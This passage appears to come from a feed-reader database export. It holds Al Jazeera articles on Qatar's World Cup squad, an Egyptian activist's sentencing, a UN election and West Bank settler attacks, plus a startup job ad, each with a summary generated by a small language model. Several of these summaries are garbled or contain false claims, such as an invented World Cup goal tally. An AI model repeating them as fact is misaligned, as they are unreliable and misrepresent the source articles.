+• Qatar are gearing up for their first FIFA World Cup in North America this summer, having qualified for the tournament after three successful rounds of qualifiers against Switzerland, Canada and Bosnia and Herzegovina. Despite facing tough opponents, Lopetegui promises a strong performance with his team making their third appearance at the finals. Almoez Ali is poised to be the team's star player, scoring 60 goals in previous World Cup seasons.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/2026-06-01T130232Z_2127529404_RC2VZ5AUTDGV_RTRMADP_3_SOCCER-WORLDCUP-GROUPB-QATAR-1780464683.jpg?resize=1920%2C1440`,published_at:1780506307,fetched_at:1780509343,content_hash:`467c26ceb418c8d316cf68be777bf67ba0c0d3527266a8d3f3cfb57e9d247a44`,tags:`Sport`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:55,feed_id:11,guid:`https://www.aljazeera.com/?t=1780500131`,url:`https://www.aljazeera.com/news/2026/6/3/egypt-sentences-activist-douma-to-prison-three-years-after-pardon?traffic_source=rss`,title:`‘Disgraceful’: Egypt jails activist Douma after article on its prisons`,content_html:`<div id="readability-page-1" class="page"><div><p><em>Egyptian activist Ahmed Douma, a leading figure in the 2011 uprising, has been repeatedly interrogated, charged and released on bail since the pardon.</em></p></div><div aria-live="polite" aria-atomic="true"><p>An Egyptian court has sentenced prominent activist and poet Ahmed Douma to one year of prison with labour for “spreading fake news”, according to state media Akhbar al-Youm.</p><p>The sentence on Wednesday comes nearly three years after the former political prisoner was <a href="https://www.aljazeera.com/news/2023/8/19/egypts-president-al-sisi-pardons-activist-douma-other-prisoners">freed by a presidential pardon</a> in August 2023, after almost 10 years behind bars.</p><section><h2>Recommended Stories </h2><span>list of 3 items</span><ul><li><span>list 1 of 3</span><a href="https://www.aljazeera.com/video/newsfeed/2026/5/25/abandoned-flotilla-boat-washes-ashore-in-egypt-with-gaza-aid">Abandoned flotilla boat washes ashore in Egypt with Gaza aid</a></li><li><span>list 2 of 3</span><a href="https://www.aljazeera.com/news/2025/12/26/keir-starmer-says-egyptian-british-activist-alaa-abd-el-fattah-back-in-uk">Keir Starmer says Egyptian-British activist Alaa Abd El-Fattah back in UK</a></li><li><span>list 3 of 3</span><a href="https://www.aljazeera.com/news/2025/1/5/egyptian-activist-al-qaradawis-family-appeal-to-lebanese-pm-for-release">Egyptian activist al-Qaradawi’s family appeal to Lebanese PM for release</a></li></ul><span>end of list</span></section><p>The charge of “spreading fake news” is regularly levelled against Egyptian dissidents, including activists, journalists and academics, as well as everyday social media users.</p><p>Douma was most recently arrested in April after publishing an article in the London-based pan-Arab news outlet Al-Araby Al-Jadeed on Egypt’s prison conditions.</p><p>Prior to his sentencing, Douma “had been held in pretrial detention … under restrictive conditions, including receiving fewer visits than permitted under Egyptian prison regulations and being continuously exposed to intense light in his cell”, according to Amnesty International.</p><p>Rights group the Egyptian Initiative for Personal Rights said the article reflected his own experiences in prison, making imprisoning him on fake news charges “unconstitutional”.</p><p>Rights group PEN America called the sentence “disgraceful”. “His case embodies part of an escalating crackdown on writers in Egypt, where poems and articles are routinely weaponised as courtroom evidence,” said PEN’s Asma Laouira.</p><h2 id="assault-on-freedom-of-expression">Assault on freedom of expression</h2><p>Amnesty International condemned Douma’s sentencing, saying it was an attack on the right to freedom of expression.</p><p>“The renewed unjust imprisonment after an unfair trial of Ahmed Douma is a devastating assault on the right to freedom of expression,” said Mahmoud Shalaby, Amnesty International’s regional researcher.</p><p>“The weaponization of the criminal justice system against Ahmed Douma and other activists lays bare President Abdel Fattah al-Sisi’s government’s relentless campaign to crush peaceful dissent and restrict civic space.”</p><p>Shalaby also called on Egypt to “immediately and unconditionally release [Douma], quash this politically motivated sentence, and end their persistent misuse of the criminal judicial system against him”.</p><p>A prominent figure in the 2011 uprising that toppled longtime President Hosni Mubarak, Douma was first convicted of taking part in an unauthorised protest and assaulting police officers.</p><p>His initial 25-year sentence was later reduced to 15 years, before he received a presidential pardon. Since then, he has been repeatedly interrogated, charged and released on bail.</p><p>In 2022, President el‑Sisi revived a presidential pardon committee, which was billed as part of a broader human rights initiative that has released hundreds of political prisoners, including prominent <a href="https://www.aljazeera.com/news/2022/11/9/who-is-alaa-abd-el-fattah-and-why-is-he-imprisoned-in-egypt-explainer">British‑Egyptian activist Alaa Abd El-Fattah</a>.</p><p>However, rights groups say a widening crackdown has seen more people detained than those released, and further restricted the space for dissent.</p><p>“[Douma’s] sentence exposes the hollow reality of the presidential pardons [that he] and others received in 2023 and signals that activists released from prolonged unjust detention are not safe from re-arrest,” said Shalaby.</p><p>Egypt has also been criticised for a sweeping crackdown on online content creators that has seen young female influencers, comedians and commentators imprisoned.</p></div></div>`,content_text:`Egyptian activist Ahmed Douma, a leading figure in the 2011 uprising, has been repeatedly interrogated, charged and released on bail since the pardon.An Egyptian court has sentenced prominent activist and poet Ahmed Douma to one year of prison with labour for “spreading fake news”, according to state media Akhbar al-Youm.The sentence on Wednesday comes nearly three years after the former political prisoner was freed by a presidential pardon in August 2023, after almost 10 years behind bars.Recommended Stories list of 3 itemslist 1 of 3Abandoned flotilla boat washes ashore in Egypt with Gaza aidlist 2 of 3Keir Starmer says Egyptian-British activist Alaa Abd El-Fattah back in UKlist 3 of 3Egyptian activist al-Qaradawi’s family appeal to Lebanese PM for releaseend of listThe charge of “spreading fake news” is regularly levelled against Egyptian dissidents, including activists, journalists and academics, as well as everyday social media users.Douma was most recently arrested in April after publishing an article in the London-based pan-Arab news outlet Al-Araby Al-Jadeed on Egypt’s prison conditions.Prior to his sentencing, Douma “had been held in pretrial detention … under restrictive conditions, including receiving fewer visits than permitted under Egyptian prison regulations and being continuously exposed to intense light in his cell”, according to Amnesty International.Rights group the Egyptian Initiative for Personal Rights said the article reflected his own experiences in prison, making imprisoning him on fake news charges “unconstitutional”.Rights group PEN America called the sentence “disgraceful”. “His case embodies part of an escalating crackdown on writers in Egypt, where poems and articles are routinely weaponised as courtroom evidence,” said PEN’s Asma Laouira.Assault on freedom of expressionAmnesty International condemned Douma’s sentencing, saying it was an attack on the right to freedom of expression.“The renewed unjust imprisonment after an unfair trial of Ahmed Douma is a devastating assault on the right to freedom of expression,” said Mahmoud Shalaby, Amnesty International’s regional researcher.“The weaponization of the criminal justice system against Ahmed Douma and other activists lays bare President Abdel Fattah al-Sisi’s government’s relentless campaign to crush peaceful dissent and restrict civic space.”Shalaby also called on Egypt to “immediately and unconditionally release [Douma], quash this politically motivated sentence, and end their persistent misuse of the criminal judicial system against him”.A prominent figure in the 2011 uprising that toppled longtime President Hosni Mubarak, Douma was first convicted of taking part in an unauthorised protest and assaulting police officers.His initial 25-year sentence was later reduced to 15 years, before he received a presidential pardon. Since then, he has been repeatedly interrogated, charged and released on bail.In 2022, President el‑Sisi revived a presidential pardon committee, which was billed as part of a broader human rights initiative that has released hundreds of political prisoners, including prominent British‑Egyptian activist Alaa Abd El-Fattah.However, rights groups say a widening crackdown has seen more people detained than those released, and further restricted the space for dissent.“[Douma’s] sentence exposes the hollow reality of the presidential pardons [that he] and others received in 2023 and signals that activists released from prolonged unjust detention are not safe from re-arrest,” said Shalaby.Egypt has also been criticised for a sweeping crackdown on online content creators that has seen young female influencers, comedians and commentators imprisoned.`,summary:`• Egyptian activist Ahmed Douma is facing criticism for his case after he was sentenced to one year in prison with labor for "spreading fake news." He was previously released by a presidential pardon in August 2023. Douma had been held in pretrial detention, receiving fewer visits than permitted under Egyptian prison regulations and being continuously exposed to intense light in his cell. Rights groups have called for the sentence to be revised and release of Douma is also demanded.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/AFP__20230819__33RL6GN__v2__HighRes__EgyptPoliticsRights-1780503246.jpg?resize=1920%2C1440`,published_at:1780506194,fetched_at:1780509343,content_hash:`72566d13f6cf65dca374be7b967bfe59e6db2c1af2aa5d49a8cf385e6e22ebe0`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:100,feed_id:1,guid:`https://news.ycombinator.com/item?id=48386588`,url:`https://www.ycombinator.com/companies/skyvern/jobs/1qRTlVx-founding-developer-marketing-open-source-ai`,title:`Skyvern (YC S23) Is Hiring Open-Source Loving DevRel Engineers`,author:`suchintan`,content_html:`<div id="readability-page-1" class="page"><div><div><div><p><a href=""><img src="https://bookface-images.s3.amazonaws.com/small_logos/87d977bf0d4b7032c71830901e118beb0ca9946c.png" alt=""/></a></p><div><p>Open Source AI Agent to automate browser workflows via an API</p></div></div><div><h2>Founding Developer Marketing – Open Source AI</h2><p><span>$100K - $150K</span><span>•</span><span>0.10% - 0.30%</span><span>•</span><span>US / CA / Remote (US; CA)</span></p><div><p>Connect directly with founders of the best YC-funded\xA0startups.</p><p><a href="https://account.ycombinator.com/authenticate?continue=https%3A%2F%2Fwww.workatastartup.com%2Fapplication%3Fsignup_job_id%3D95750&amp;defaults%5BsignUpActive%5D=true&amp;defaults%5Bwaas_company%5D=28887">Apply to role ›</a></p></div></div><h2>About the role</h2><div><p>Skyvern is an open-source AI agent that automates anything in a browser. YC-backed. Growing fast.</p>
+<p>We have a product developers get excited about when they see it. The problem: not enough developers have seen it.</p>
+<p>We need someone who can make Skyvern impossible to ignore. Someone who understands the product deeply enough to demo it, explain it, and make content that actually resonates with technical audiences.</p>
+<p><strong>The work</strong></p>
+<ul>
+<li>Create YouTube content—demos, tutorials, deep dives—that developers actually watch</li>
+<li>Produce short-form content for Twitter, LinkedIn, TikTok, wherever devs scroll</li>
+<li>Build and own Skyvern&#39;s social presence from the ground up</li>
+<li>Engage authentically with the open-source and AI community (not just broadcast—actually participate)</li>
+<li>Dream up and execute viral campaigns. We&#39;re an AI agent that can browse the internet—there&#39;s a lot to work with.</li>
+<li>Experiment constantly. Double down on what works, kill what doesn&#39;t.</li>
+</ul>
+<p><strong>Why this role is interesting</strong></p>
+<ul>
+<li>The product demos well. AI agents doing browser tasks is inherently visual and satisfying to watch.</li>
+<li>Open source = built-in community. You&#39;re not selling—you&#39;re building genuine relationships.</li>
+<li>Small team, big canvas. No brand guidelines committee. You&#39;d define the voice.</li>
+<li>You&#39;d be early at a company in a category (AI agents) that&#39;s about to get very loud. First-mover advantage matters.</li>
+</ul>
+<p><strong>You</strong></p>
+<ul>
+<li>You&#39;ve built an audience before—your own or someone else&#39;s. Show us.</li>
+<li>You can explain technical products without dumbing them down or losing people.</li>
+<li>Comfortable on camera. You don&#39;t need a production team to ship a good video.</li>
+<li>Strong writer. Your tweets and posts don&#39;t sound like marketing.</li>
+<li>Plugged into the AI/dev tools world. You know what&#39;s resonating and why.</li>
+<li>Scrappy. You&#39;ll do the editing, the posting, the replies, the A/B tests—whatever it takes.</li>
+<li>Bonus: you&#39;ve written code. You can actually run Skyvern, not just talk about it.</li>
+</ul>
+<p><strong>Apply</strong></p>
+<p>Send your best content—videos, threads, posts, campaigns. Follower counts matter less than quality. Show us something you made that you think is genuinely good.</p>
+</div><h2>About Skyvern</h2></div><div><div><p><a href="https://www.ycombinator.com/companies/skyvern" rel="noopener noreferrer" target="_blank"><img src="https://bookface-images.s3.us-west-2.amazonaws.com/logos/545215058f585c8e167f649e8675e03389eccaa0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQC4NIECALYA2S43X%2F20260603%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20260603T175544Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHoaCXVzLXdlc3QtMiJHMEUCIQDwkCiyYW6zENPly%2BLa0YobDK6rvmO8bDH9mjgJOeQDEwIgS%2FPya%2F4GwWh45BKmMu8DodTxOfw8O7PbdF2%2FFz9Om1Yq5QMIQxAAGgwwMDYyMDE4MTEwNzIiDEYRcKk4ch%2BqRyGauyrCAzGliew7cNlFA4q%2F9iy6iqNlcY1xm6D8WQd7YG%2FH5g06kMtxbM8Ffn%2BlRtWqKRssLqVM0LnUzEuNXIBwuXfoy9fNQh2rczid11iDZ2x2BTFXOyaMifzfDahuBH13ZqBh%2FTmSpEjq%2BLnsqzaQquCUzX%2FUVhg5ieTewa0MigHP9JRExQgshqrS6p42UvniBk3qE%2Bva1Ef%2BU3oOiuIN5y5MjJPQRJUMTSguyn%2FRgUq2o3krAQekqOcibZOmJ32dfobMIE96M9MVAy0CtAkJfhPgxlZGLNASBsVI7gu6KOI%2BYXiBFLdQP%2FQW2E8QkiyebWeONII41ZDYQiJhZ%2FgTGHL3bGkn4lQ574m7K%2BN4KwKexqxb7boLuHEylMncwdosjzDsm7mJoil9Hj5NiYiH4nEu%2B7igLh8eyMSKk%2Fd%2FOWLKhw71ZQUv8vp%2FC2iDED%2FQC1BqmbtT5xKxF5%2FGYby0k9vD2SUBVbT4jXFRJrH75JPIvS0cNnuTYYXqxeKrC2ZjL43clzWkIEmsVJStAPlnswQWMwXzfvPCxlOnQdAYZ0GLNCdRWm0ZS%2FYYTCpqrSkUmI%2FeojIQDFgiuaTCUUVztX7%2FRFmCRTDN0YHRBjqlAaUelzZId1KKnupoI16dudafyKD4fXQncuOKmcJSxCV8gESILacacbG6aqC5kmViMIH2KfWXxfbTrBYk49o6XH%2B%2BUqtMric9CPWOK2XdmQ%2BsAosBzWjzf3fsmP7cvpD6PvT%2BK06jnlzuzyA8bik13Hfbdx6P1ByE5nXSezpmkOYmwq0mie4RW8EIdt6G7bza9emBDmVbMUdaV%2FA2qkiySyizegGoQQ%3D%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=2eb232b47e18944b40612d7b8afee8bbc25410ba84c0bf6525483ed58078a374" alt="Skyvern"/></a></p><div><p><span>Founded:</span><span>2023</span></p><p><span>Batch:</span><span>S23</span></p><p><span>Team Size:</span><span>6</span></p><p><span>Status:</span><span>Active</span></p><p><span>Location:</span><span>San Francisco</span></p><div><a aria-label="Company website" data-tooltip-content="https://www.skyvern.com/" data-tooltip-id="social-tooltip-skyvern" href="https://www.skyvern.com/" rel="nofollow noopener noreferrer" target="_blank"></a><a aria-label="LinkedIn profile" data-tooltip-content="LinkedIn" data-tooltip-id="social-tooltip-skyvern" href="https://www.linkedin.com/company/95726232" rel="nofollow noopener noreferrer" target="_blank"></a><p><a aria-label="X (Twitter) account" data-tooltip-content="X" data-tooltip-id="social-tooltip-skyvern" href="https://x.com/skyvernai" rel="nofollow noopener noreferrer" target="_blank"><img src="https://www.ycombinator.com/images/social/x-logo.svg" alt="X (Twitter) logo"/></a></p></div></div></div><p>Founders</p></div></div></div>`,content_text:`Open Source AI Agent to automate browser workflows via an APIFounding Developer Marketing – Open Source AI$100K - $150K•0.10% - 0.30%•US / CA / Remote (US; CA)Connect directly with founders of the best YC-funded\xA0startups.Apply to role ›About the roleSkyvern is an open-source AI agent that automates anything in a browser. YC-backed. Growing fast.
+We have a product developers get excited about when they see it. The problem: not enough developers have seen it.
+We need someone who can make Skyvern impossible to ignore. Someone who understands the product deeply enough to demo it, explain it, and make content that actually resonates with technical audiences.
+The work
+
+Create YouTube content—demos, tutorials, deep dives—that developers actually watch
+Produce short-form content for Twitter, LinkedIn, TikTok, wherever devs scroll
+Build and own Skyvern's social presence from the ground up
+Engage authentically with the open-source and AI community (not just broadcast—actually participate)
+Dream up and execute viral campaigns. We're an AI agent that can browse the internet—there's a lot to work with.
+Experiment constantly. Double down on what works, kill what doesn't.
+
+Why this role is interesting
+
+The product demos well. AI agents doing browser tasks is inherently visual and satisfying to watch.
+Open source = built-in community. You're not selling—you're building genuine relationships.
+Small team, big canvas. No brand guidelines committee. You'd define the voice.
+You'd be early at a company in a category (AI agents) that's about to get very loud. First-mover advantage matters.
+
+You
+
+You've built an audience before—your own or someone else's. Show us.
+You can explain technical products without dumbing them down or losing people.
+Comfortable on camera. You don't need a production team to ship a good video.
+Strong writer. Your tweets and posts don't sound like marketing.
+Plugged into the AI/dev tools world. You know what's resonating and why.
+Scrappy. You'll do the editing, the posting, the replies, the A/B tests—whatever it takes.
+Bonus: you've written code. You can actually run Skyvern, not just talk about it.
+
+Apply
+Send your best content—videos, threads, posts, campaigns. Follower counts matter less than quality. Show us something you made that you think is genuinely good.
+About SkyvernFounded:2023Batch:S23Team Size:6Status:ActiveLocation:San FranciscoFounders`,summary:`Skyvern (YC S23) Is Hiring Open-Source Loving DevRel Engineers One or two short factual points about the article: - Skyvern is an open-source AI agent that automates browser workflows via an API. - Developers can apply to the role through a platform like Connect directly with founders of YC-funded startups. Cleaned version of the article with promotional content removed: Skyvern (YC S23) Is Hiring Open-Source Loving DevRel Engineers About Skyvern YC-backed startup Skyvern is looking for developers who can bring an open-source AI agent to life. The company has a growing user base of developers who see the product. Who We're Looking For Open Source AI Agent to Automate Browser Workflows via an API YC-funded startups and start-ups like YC-S23 have an open-source AI agent that helps automate browser workflows, making it possible for developers to take full control of their coding tasks. Requirements - Someone who can make Skyvern impossible to ignore. Someone who understands the product deeply enough to demo it, explain it, and make content that actually resonates with technical audiences. - A team of 6 developers working in a remote setting (San Francisco). - The role is open to applicants based on the developer's background in both video production and open-source software development. Apply Now Send your best content—videos, threads, posts, campaigns. Follower counts matter less than quality. Show us something you made that you think is genuinely good. About Skyvern Founded: 2023 Batch: S23 Team Size: 6 Status: Active Location: San Francisco Founders: Not specified What the article contains: - The company's founding year (2023) - The batch of founders (Batch: S23) - The type of AI agent Skyvern is - The purpose of the role - The requirements for the developer candidates`,summary_model:`qwen2.5:0.5b`,image_url:`https://bookface-images.s3.amazonaws.com/logos/545215058f585c8e167f649e8675e03389eccaa0.png?1704078466`,published_at:1780506060,fetched_at:1780509344,content_hash:`ea51caeb47d6467087489228504cbed5910174c8804e0c73778c150f6aee6e93`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:59,feed_id:11,guid:`https://www.aljazeera.com/?t=1780499409`,url:`https://www.aljazeera.com/news/2026/6/3/bangladeshs-rahman-elected-un-general-assembly-president-in-tight-race?traffic_source=rss`,title:`Bangladesh’s top diplomat elected UN General Assembly leader in tight race`,content_html:`<div id="readability-page-1" class="page"><div><p><em>Khalilur Rahman elected as the president of the UNGA’s 81st session, garnering 99 votes in secret ballot.</em></p></div><div aria-live="polite" aria-atomic="true"><p>Bangladesh’s Foreign Minister Khalilur Rahman has been elected president of the 81st session of the United Nations General Assembly after defeating Cyprus’s Ambassador Andreas Kakouris in a closely contested vote, taking the helm of the world’s most representative diplomatic body at a time of mounting pressure on the multilateral system.</p><p>In the secret ballot held on Tuesday, Rahman secured 99 votes, eight more compared with his competitor Kakouris. A total of 190 ballots were cast, with no invalid votes or abstentions.</p><section><h2>Recommended Stories </h2><span>list of 3 items</span><ul><li><span>list 1 of 3</span><a href="https://www.aljazeera.com/news/2025/12/7/what-has-germanys-position-been-on-israels-genocide-in-gaza">What has Germany’s position been on Israel’s genocide in Gaza?</a></li><li><span>list 2 of 3</span><a href="https://www.aljazeera.com/news/2025/12/8/one-year-since-the-fall-of-bashar-al-assad-a-timeline">One year since the fall of Bashar al-Assad: A timeline</a></li><li><span>list 3 of 3</span><a href="https://www.aljazeera.com/news/2025/12/20/uns-top-court-to-hold-myanmar-genocide-hearings-in-january">UN’s top court to hold Myanmar genocide hearings in January</a></li></ul><span>end of list</span></section><p>The presidency rotates among the UN’s five regional groups, and the 81st session falls to the Asia Pacific group. Rahman will serve a one-year term starting on September 8, the UN said.</p><p>His presidency will coincide with one of the most consequential processes on the UN calendar: the selection of Secretary-General Antonio Guterres’s successor, whose term expires at the end of this year.</p><p>Rahman served as national security adviser and high representative on the Rohingya issue before becoming Bangladesh’s foreign minister in February when the Bangladesh Nationalist Party (BNP) won in the country’s <a href="https://www.aljazeera.com/news/2026/2/13/bangladesh-election-results-2026-who-won-who-lost-whats-next">first election</a> since a student-led uprising ousted longtime leader Sheikh Hasina in 2024.</p><p>A career diplomat, he joined Bangladesh’s foreign service in 1979. He also held senior UN positions in New York and Geneva, according to UN News.</p><p>“The UN will commence its ninth decade at a time when trust in our organisation is being tested on multiple fronts,” he told diplomats assembled at the UNGA as he accepted the new role. “Taken together, these challenges tend to undermine the public trust and confidence in the ability of our organisation to deliver its promises.”</p><p>Outgoing UNGA President Annalena Baerbock, Germany’s foreign minister, highlighted how trust towards multilateralism is under growing strain.</p><p>The UN is facing “not only headwinds, but immense pressure”, with consensus increasingly difficult to achieve and defence of the UN Charter becoming “a daily necessity”.</p><p>“The role of the president of the General Assembly is no longer simply procedural,” she said.</p><h2 id="forum-for-key-global-topics">Forum for key global topics</h2><p>The General Assembly is the UN’s most representative body, bringing together all 193 Member States, each with one vote. Its annual gathering in September in New York is the only UN forum where world leaders of all countries, small and large, can speak.</p><p>While its resolutions are generally not legally binding, the body serves as the principal forum for international deliberation on key topics, from security to human rights, reflecting global opinion.</p><p>The UNGA also makes key decisions for the UN, including appointing the secretary-general on the recommendation of the UN Security Council, electing the non-permanent members of the UNSC and approving the UN budget.</p><p>The coming session will open on September 8.</p></div></div>`,content_text:`Khalilur Rahman elected as the president of the UNGA’s 81st session, garnering 99 votes in secret ballot.Bangladesh’s Foreign Minister Khalilur Rahman has been elected president of the 81st session of the United Nations General Assembly after defeating Cyprus’s Ambassador Andreas Kakouris in a closely contested vote, taking the helm of the world’s most representative diplomatic body at a time of mounting pressure on the multilateral system.In the secret ballot held on Tuesday, Rahman secured 99 votes, eight more compared with his competitor Kakouris. A total of 190 ballots were cast, with no invalid votes or abstentions.Recommended Stories list of 3 itemslist 1 of 3What has Germany’s position been on Israel’s genocide in Gaza?list 2 of 3One year since the fall of Bashar al-Assad: A timelinelist 3 of 3UN’s top court to hold Myanmar genocide hearings in Januaryend of listThe presidency rotates among the UN’s five regional groups, and the 81st session falls to the Asia Pacific group. Rahman will serve a one-year term starting on September 8, the UN said.His presidency will coincide with one of the most consequential processes on the UN calendar: the selection of Secretary-General Antonio Guterres’s successor, whose term expires at the end of this year.Rahman served as national security adviser and high representative on the Rohingya issue before becoming Bangladesh’s foreign minister in February when the Bangladesh Nationalist Party (BNP) won in the country’s first election since a student-led uprising ousted longtime leader Sheikh Hasina in 2024.A career diplomat, he joined Bangladesh’s foreign service in 1979. He also held senior UN positions in New York and Geneva, according to UN News.“The UN will commence its ninth decade at a time when trust in our organisation is being tested on multiple fronts,” he told diplomats assembled at the UNGA as he accepted the new role. “Taken together, these challenges tend to undermine the public trust and confidence in the ability of our organisation to deliver its promises.”Outgoing UNGA President Annalena Baerbock, Germany’s foreign minister, highlighted how trust towards multilateralism is under growing strain.The UN is facing “not only headwinds, but immense pressure”, with consensus increasingly difficult to achieve and defence of the UN Charter becoming “a daily necessity”.“The role of the president of the General Assembly is no longer simply procedural,” she said.Forum for key global topicsThe General Assembly is the UN’s most representative body, bringing together all 193 Member States, each with one vote. Its annual gathering in September in New York is the only UN forum where world leaders of all countries, small and large, can speak.While its resolutions are generally not legally binding, the body serves as the principal forum for international deliberation on key topics, from security to human rights, reflecting global opinion.The UNGA also makes key decisions for the UN, including appointing the secretary-general on the recommendation of the UN Security Council, electing the non-permanent members of the UNSC and approving the UN budget.The coming session will open on September 8.`,summary:`• Bangladesh's top diplomat Khalilur Rahman has been elected as the president of the United Nations General Assembly after defeating Cyprus’s Ambassador Andreas Kakouris in a close vote. Rahman secured 99 votes, eight more than his opponent, and is set to serve a one-year term from September 8, starting on the UN agenda.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/ap_6a204f7515185-1780502389.jpg?resize=1920%2C1333`,published_at:1780505091,fetched_at:1780509343,content_hash:`62f92fff2e6e220f7e349d5444f41fe129148a2c0ce2f9a93081059385fe2f20`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:75,feed_id:11,guid:`https://www.aljazeera.com/?t=1780419953`,url:`https://www.aljazeera.com/features/2026/6/3/israeli-settlers-are-driving-palestinian-shepherds-from-their-grazing-lands?traffic_source=rss`,title:`Israeli settlers are driving Palestinian shepherds from their grazing lands`,content_html:`<div id="readability-page-1" class="page"><div aria-live="polite" aria-atomic="true"><p>Mukhlis Masa’id of <a href="https://www.aljazeera.com/news/2010/11/25/israel-pulls-down-west-bank-mosque">Khirbet Yarza</a> in the occupied West Bank has lived in a state of sorrow since settlers intensified their attacks on his Jordan Valley community three years ago.</p><p>He and other local Palestinians have seen settlers destroy their crops, attack their homes, and assault shepherds and farmers working the grazing lands around the village, with growing ferocity and incidence.</p><p>Fourteen families, about 100 Palestinians in total, called this region home until increasing violent settler activity forced them to consider their future here. Early this year, locals decided they had had enough with the near-daily settler attacks, so they gathered their surviving livestock and left the village.</p><p>This sustained targeting of agriculture in the area – on which almost the entire community relies – appears to be part of an organised and systematic campaign of intimidation by settlers, intended to drive whole Palestinian farming communities from their land.</p><p>“The settlers have many means of communication among themselves. When they attack the shepherds, dozens of them gather to intimidate them. Meanwhile, we have no means of transportation to reach the shepherds and try to protect them. Our roads are also rough and unpaved, unlike the roads used by the settlers,” Masa’id told Al Jazeera.</p><p>The settlers didn’t stop there; they stole hundreds of sheep and cattle, the lifeblood of this northern West Bank community.</p><p>“We feel like we’ve lost a son. What happened to us is the worst thing that could ever happen – to leave the homes we’ve lived in all our lives, homes we hoped our children and grandchildren would live in too,” he told us.</p><p>The settler attacks intensified from October 2023, months after a new Israeli government came to power with far-right ministers – who led or are part of settler movements – appointed to key posts. The campaign continued until the community had fled their homes in March 2026, but even then, their troubles did not end.</p><p>“Dozens of sheep died from diseases after we moved. When we left, we had to leave the fodder in the rain because there was nowhere else to store it, and it spoiled,” Masa’id said.</p><p>“Now, we graze the remaining livestock in cramped, overcrowded areas like the countryside around Tubas. Nothing we’re living now resembles our life in Yirza.”</p><figure id="attachment_4620768" aria-describedby="caption-attachment-4620768"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/06/original-ACC0BB49-41F4-4B7A-A741-E8E7800CE07F-2-1780414554.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="Bedouin people who were forced to leave their lands under the settlers attacks. [Courtesy of Mohamad Ateeq]" fetchpriority="low"/><figcaption id="caption-attachment-4620768">Bedouin people who were forced to leave their lands under the settlers’ attacks [Courtesy of Mohamad Ateeq]</figcaption></figure><p>The pattern of repeated attacks by settlers doesn’t only target Area C, the part of the occupied West Bank fully under Israeli control and which makes up more than 60 percent of the West Bank.</p><p>There appear to be broader objectives related to the entire Palestinian territory, which has been under Israeli occupation since 1967. This includes Area A, a zone technically under full Palestinian Authority control but witnessing increasing settler activity.</p><p>Zuhair Abu Shaar, from Jifna, north of Ramallah, was shocked to see a group of Israeli settlers unexpectedly storm his livestock pen, in the heart of the village, on April 15.</p><p>The villagers confronted the band, who briefly left the area, but they returned half an hour later with 12 Israeli military vehicles in support.</p><p>“The soldiers got out of the vehicles on foot and came to us with the settlers. They stole 180 head of cattle, took them away, assaulted us, and shot one of my neighbours in the leg,” Abu Shaar told Al Jazeera.</p><p>“They also struck my nephew hard in the side, in the area of a surgery he had months ago, causing him to fall to the ground. When I tried to defend him, they beat me, handcuffed me, threw me to the ground, and pointed a gun at my head.”</p><p>The army emptied the entire pen except for one sick sheep that couldn’t walk and withdrew behind a cloud of tear gas, with a donkey and a car they found in the village in tow.</p><p>Zuhair estimates his losses at no less than 450,000 shekels ($150,000) and has no information on the livestock, his sole source of income, that were stolen by the settler party.</p><p>“I’m like someone whose house is demolished and is rebuilding it brick by brick. I’m trying to start from scratch. This is an occupation, and we expect anything from them as they try to force us out of our land,” he added.</p><figure id="attachment_4620766" aria-describedby="caption-attachment-4620766"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/06/processed-5362C8FE-FF3F-4BAE-85C1-F2E2CDC2FA44-1-1780414552.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="Zuhair Abu Sha&#39;ar [Courtesy of Mohamad Turkman]" fetchpriority="low"/><figcaption id="caption-attachment-4620766">Zuhair Abu Sha’ar has seen his livestock stolen by Israeli settlers [Courtesy of Mohamad Turkman]</figcaption></figure><p>Nidal Younis, head of the Masafer Yatta village council, south of Hebron, told Al Jazeera that over the past three years, almost all the grazing lands in the area have been seized by settlers.</p><p>Settler groups have established 12 new outposts around Masafer Yatta, in addition to appropriating more than 90 percent of land cultivated with winter crops, such as wheat and barley, according to officials in the area.</p><p>“Last year, settlers prevented people from harvesting their crops while simultaneously bringing their sheep to graze on them,” said Younis. “They also prevented farmers from ploughing their land by attacking tractors and assaulting the farmers.”</p><p>On January 27, settlers attacked a village in the Masafer Yatta area and stole 300 head of livestock. Even those grazing sheep on land outside the area were attacked, had their livestock stolen, or were beaten.</p><p>“The cost of livestock has become very high for people, and many families have sold part of their herds to be able to feed the rest,” he said.</p><p>“There is a sharp annual decline in livestock in Masafer Yatta, and what remains is less than 25 percent of what it was several years ago.”</p><p><a href="https://www.ochaopt.org/content/humanitarian-situation-report-15-may-2026" rel="noopener" target="_blank">According to a report issued</a> by the United Nations Office for the Coordination of Humanitarian Affairs (OCHA) in mid-May 2026, the Jordan Valley has seen the number of monthly incidents resulting in injuries or property damage rise from two per month in 2020 to 27 in the first four months of 2026.</p><p>These cases are no longer limited to individual attacks on Palestinians, but have targeted the whole way of life for these agricultural communities after sustained attacks on pastures, water sources and reservoirs. Agricultural equipment and facilities, such as animal pens, have also been destroyed.</p><p>The OCHA warned that the repeated targeting of Palestinian agriculture threatens to undermine families’ ability to maintain their livelihoods, due to many residents depending on herding as their primary source of income. A 2025 report published by the Food and Agriculture Organization of the United Nations (FAO) showed that nearly two-thirds of the 72,000 farming and herding families in the occupied West Bank required emergency assistance.</p><p>Abbas Melhem, head of the Union of Palestinian Agricultural Associations, told us that 87 percent of the livestock sector is concentrated in an area stretching from Masafer Yatta to the Jordan Valley in the east, most of which is in 